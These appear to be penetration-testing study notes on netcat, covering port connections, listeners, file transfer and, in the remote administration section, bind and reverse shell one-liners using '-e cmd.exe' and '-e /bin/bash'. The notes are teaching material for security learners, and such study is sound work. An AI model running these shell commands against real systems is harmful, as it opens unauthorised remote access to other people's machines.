# PRACTICAL TOOLS
+ Modern security professional uses various tools but there may be limited ones in target system after gaining access
+ So we learn how to deliver our tools to target machine and so on...

# 1 - NETCAT
+ one of original tools for penetration testers
+ It reads and writes data through network using TCP/UDP protocols

## 1.1 - CONNECTING TO A TCP/UDP PORT
+ netcat can run in client/server mode
+ We can connect to remote server using IP/PORT of the server

```bash
# Connect to server assigned <DESTINATION IP> with port <PORT>
nc -n -v <DESTINATION IP> <PORT>
# -n prevents name resolution and -v is verbose mode
```

## 1.2 - LISTENING ON A TCP/UDP PORT
+ Usefull for recieving in network connections
+ Making a chat server using netcat

```bash
# server for listening
nc -lvnp <PORT>
# -l is listening mode
# -v is verbose mode
# -n is no name resolution mode
# -p is specified port

# client
nc <IP ADDRESS> <PORT>

# After connecting enter text to chat
```


## 1.3 - LISTENING ON A TCP/UDP PORT
+ We can transfer files using netcat like server/client chat example with some minor differences
+ We should guess when the transfer is done based on file size
+ We can confirm that the file is transfered successfully by calculating sha256 hash

```bash
# Server which recieves the file
nc -lvnp <PORT> > /path/to/file

# Client which sends the file
nc <IP ADDRESS> <PORT> < /path/to/file
```

## 1.4 - REMOTE ADMINISTRATION WITH NETCAT
+ netcat has command redirection
+ It can redirect input/output of an executable to a TCP/UDP port

![01](./images/01.png)

Bob is running Windows and Alice is running Linux\
In first scenario Alice wants to connect to Bob's machine and do stuff

**netcat bind shell scenario**
+ Bob starts netcat as server and bind `cmd.exe` to port 4444
+ netcat bind `cmd.exe` to port 4444 and redirect input/output/error of `cmd.exe` to port 4444
+ So anyone connecting to Bob's IP address on port 4444 wil be prompted `cmd.exe` and his WIndows comand prompt shell

```bash
# Bob's Windows machine as a server
nc -lvnp 4444 -e cmd.exe

# Alice's Linux machine as a client
nc -nv <Bob IP> 4444
# this will result Bob's computer cmd.exe
```


![02](./images/02.png)
In second scenario Bob wants to connect to Alice's computer and do stuff
**netcat reverse shell scenario**
+ First Bob starts netcat on port 4444 on his Windows machine
+ Alice can send reverse shell from her Linux machine to Bob

```bash
# Bob's Windows machine as a server
nc -lvnp 4444

# Alice's Linux machine as a client
nc -nv <Bob IP> 4444 -e /bin/bash
# this will result reverse shell from Alice's computer to Bob on port 4444
```

+ Take some time to read about **bind**/**reverse** shell scenario

# 2 - SOCAT
